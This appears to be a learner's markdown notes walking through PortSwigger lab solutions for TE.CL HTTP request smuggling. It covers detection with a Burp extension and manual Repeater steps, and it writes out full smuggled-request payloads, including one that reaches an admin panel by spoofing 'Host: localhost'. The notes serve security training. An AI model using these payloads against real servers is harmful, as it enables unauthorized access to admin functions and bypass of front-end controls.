
#### 1.2. Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses ⭕️
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.
To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.
##### Automated Method
- `GET /` request > right click > extensions > HTTP Request Smuggler > Smuggle probe > get a TE.CL hit.
	- ![[HTTP Request Smuggling-20260201093109177.png]]

##### Manual Method
1. Send `GET /` to Repeater > change `HTTP/2` to `HTTP/1.1` > Send > 200 OK.
	1. ![[HTTP Request Smuggling-20260128210501980.png]]
2. Right click > change request method (will change to `POST`). Optional: remove unnecessary headers. Toggle on `\n` button to show non-printable characters. Uncheck Update Content-Length.
	1. ![[HTTP Request Smuggling-20260201092359072.png|381]]
3. Set the following and notice a "Invalid request" error (response came back quick, didn't timeout). TE.CL attack might be possible.
	1. `Content-Length: 6`
	2. Add `Transfer-Encoding: chunked`
	3. Follow the screenshot for the rest
		1. ![[HTTP Request Smuggling-20260201092707081.png]]
4. Set the request like the screenshot and notice a "Communication timed out" response. Further indicating a possible TE.CL attack.
	1. ![[HTTP Request Smuggling-20260201093331674.png]]
5. Rename this request as Attacker and send a fresh `GET /` request to Repeater as Victim and downgrade Victim request to HTTP 1.1.
6. Attacker request
	1. Copy paste lines 1-4 and paste it and set it up like the screenshot
	2. The Smuggled request content-length (line 11) should be the length of lines 13-15 and add 1 to it. So 10 + 1 = 11. But the video solution put 15 to be safe.
		1. ![[HTTP Request Smuggling-20260201094046248.png]]
	3. Update line 7 to be the hex value of highlighting line 8-13 after `x=1` but before `\r\n` which is `a5`.
		1. ![[HTTP Request Smuggling-20260201094246583.png|339]]
	4. Update line 4 to be the # of bytes (or length) of line 7 which is 4.
		1. ![[HTTP Request Smuggling-20260201094422166.png|249]]
	5. The finished attacker request will look like below > send > and notice a 200 OK
		1. ![[HTTP Request Smuggling-20260201094628320.png]]
7. Send the Victim request notice a 404 Not Found. Attacker successfully smuggled the `/throws404` request and the Victim received it. Lab solved.
	1. ![[HTTP Request Smuggling-20260201094755069.png]]

>[!tip] How to Identify this Vulnerability
>1. Automated: HTTP Request Smuggler > Smuggle probe
>2. Manual:
>	1. `HTTP/2` 
>	2. No `Transfer-Encoding: chunked` header
>	3. Got a `500` code and "Invalid request" response after `Transfer-Encoding` request

---
#### 1.x. Lab: HTTP request smuggling, basic TE.CL vulnerability ⭕️
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

>Using HTTP Request Smuggler > Smuggle probe on `GET /` will show us the vulnerability.
>![[HTTP Request Smuggling-20260201205253911.png]]

1. `GET /` to Repeater > change request method > uncheck update content-length > remove unnecessary headers > show non-printable characters > Send > 200 OK
	1. ![[HTTP Request Smuggling-20260201205142628.png]]
2. Enter the payload below > Send > got an 400 error "Invalid request". **This confirms that the frontend is using transfer encoding chunked (TE)**.
	1. ![[HTTP Request Smuggling-20260201205434403.png]]
```
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X

```

3. Change lines 7-9 with the payload below > make sure the content length matches the highlight of it. Send. Got a "Communication timed out". **This confirms the backend is using content length (CL)**.
	1. ![[HTTP Request Smuggling-20260201205723468.png]]
```
0

X
```

4. Name this request "Attacker" grab the same `GET /` to Repeater and name it Victim.
5. Victim request:
	1. Repeat Step 1 to make it as close as the Attacker request as possible and add `foo=bar`. Send and get 200 OK.
		1. ![[HTTP Request Smuggling-20260201205947522.png]]
6. Attacker request
	1. Change lines 7-10 to be like the screenshot, update content-length to 3 > Send > get 200 OK.
		1. ![[HTTP Request Smuggling-20260201210155933.png]]
7. Victim request: Send and get "Unrecognized method G0POST" error. Request successfully smuggled.
	1. ![[HTTP Request Smuggling-20260201210234098.png]]
8. Attacker request:
	1. Follow the screenshot. Send.
		1. ![[HTTP Request Smuggling-20260201210955793.png]]
```
POST / HTTP/1.1
Host: 0abe006e0485d2eb846bef330012004a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

9. Send victim request and solve.
	1. ![[HTTP Request Smuggling-20260201211028772.png]]

>[!tip] How to Identify this Vulnerability
>1. 

---
#### 1.4. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability ⭕️
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.
To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

1. Send `/` request to repeater, change the request to POST, remove every header except POST, Host, Content-Type, and Content-Length, name it attacker, set HTTP to 1.1, setting icon next to Send: uncheck Update Content length, show non-printable characters `\n`, and duplicate the request and name it victim and add `foo=bar` in the body, send, make sure the victim request to get a 200 OK back. *Don't send the attacker's request yet, it won't work.*
	1. For the victim's request, keep Update Content Length *checked*.
		1. ![[HTTP Request Smuggling-20251111142010867.png|408]]
2. Setup the attacker request like so 
	1. ![[HTTP Request Smuggling-20251111134408536.png|483]]
3. Now we need to calculate the *Smuggled Request Chunk Size*: highlight the `GET` request we added and look at Inspector. The hex value should be `1d`. That is the chunk size. In the line above the `GET` request, add `1d` like so
	1. ![[HTTP Request Smuggling-20251111134628416.png|344]]
4. Calculate the `Content-Length` of the attacker request by highlighting the `1d\r\n` and look at Inspector. It should say 4. Set that as the `Content-Length` like so
	1. ![[HTTP Request Smuggling-20251111135113963.png|316]]
5. Time to calculate the `Content-Length` for the Smuggled Request: highlight `0\r\n \r\n` and look at Inspector, you should see 5 but we need to add at least an extra byte so make that **6**. Add a new line after `Content-Length` Like so
	1. ![[HTTP Request Smuggling-20251111135418562.png|344]]
6. Update the Chunk Size: highlight the Smuggled Request's `GET` line and the `Content-Length` line, look at Inspector's hex value and we should see `0x30` *or whatever yours is. If you have `/admin` it will say 28 instead*. So on line 7 where `1d\r\n` is and replace it with `30\r\n`. Click Send and we should still get a 200 OK.
	1. ![[HTTP Request Smuggling-20251111135719443.png|432]]
7. To ensure that the attack is working correctly, go to victim's request and click Send. We should see a 404 Not Found (originally it was 200 OK). 400 Not Found means the attack is working.
8. Change the `GET` request's endpoint to `/admin` which is our objective. Gotta update the Chunk Size again so repeat Step 6. Send it. The attacker request should still say 200 OK.
	1. ![[HTTP Request Smuggling-20251111140027689.png|279]]
9. Victim's request, Send, we get a 401 Unauthorized. Error message says "Admin panel is for local users only". Now we need to trick the server to think that the request is coming from a local user. Back in the attacker's request, add `Host: localhost` under the `GET /admin` line, highlight the 3 lines to update the Chunk Size again, and Send; get 200 OK.
	1. ![[HTTP Request Smuggling-20251111141119500.png|330]]
10. Victim's request, Send, how we have access to the admin panel. Scroll down to see the `<a>` tag link that performs the action to delete carlos (our objective). Copy `/admin/delete?username=carlos` and paste it in the attacker's request's `GET` line. Repeat Step 8 to update the Chunk Size. Send the attacker's request. 
	1. ![[HTTP Request Smuggling-20251111150716178.png]]
11. Victim's request, Send. See a 302 status code. Go back to the browser and refresh and solved.

**Use in exam**
```
POST / HTTP/1.1
Host: 0a31007604b5b2c080bd2bda00e9008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```


- - - 